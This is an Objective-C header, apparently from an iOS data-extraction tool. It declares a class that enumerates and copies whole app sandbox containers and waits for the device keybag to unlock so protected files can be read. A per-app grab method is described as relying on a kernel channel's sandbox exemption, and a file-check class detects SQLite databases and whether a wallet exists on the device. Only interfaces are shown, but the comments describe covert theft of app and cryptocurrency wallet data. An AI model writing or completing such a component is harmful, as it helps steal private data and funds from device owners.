#import <Foundation/Foundation.h>
#import "OWCommon.h"

NS_ASSUME_NONNULL_BEGIN

extern NSString * const OWContainerPassDidFinishNotification;

@interface OWContainerPass : NSObject

@property (nonatomic) uint64_t maxFileBytes;        // 单文件门限，默认 200MB
@property (nonatomic) uint64_t maxContainerBytes;   // 整容器门限，默认 800MB
@property (nonatomic) BOOL requireProtectedData;    // 默认 YES：keybag 未解锁则等待，不误判空

@property (nonatomic, readonly) NSString *workDir;
@property (nonatomic, readonly) NSArray<NSDictionary *> *results;
@property (nonatomic, readonly, nullable) NSString *lastError;

// 主流程：pass1 枚举匹配 → pass2 定向补漏 → 兜底整容器
- (BOOL)run:(NSError **)error;

// 单目标定向抓取（供内核通道拿到沙箱豁免后补读）
- (BOOL)grabBundleId:(NSString *)bundleId toDir:(NSString *)dir error:(NSError **)error;

@end

#pragma mark - 文件校验

@interface OWFileGate : NSObject
+ (BOOL)isSQLiteAtPath:(NSString *)path;
+ (BOOL)isPlausiblePayloadAtPath:(NSString *)path minBytes:(uint64_t)minBytes maxBytes:(uint64_t)maxBytes;
+ (BOOL)looksEmptyDatabaseAtPath:(NSString *)path;   // 表结构在但 0 行：设备上没建钱包
@end

NS_ASSUME_NONNULL_END
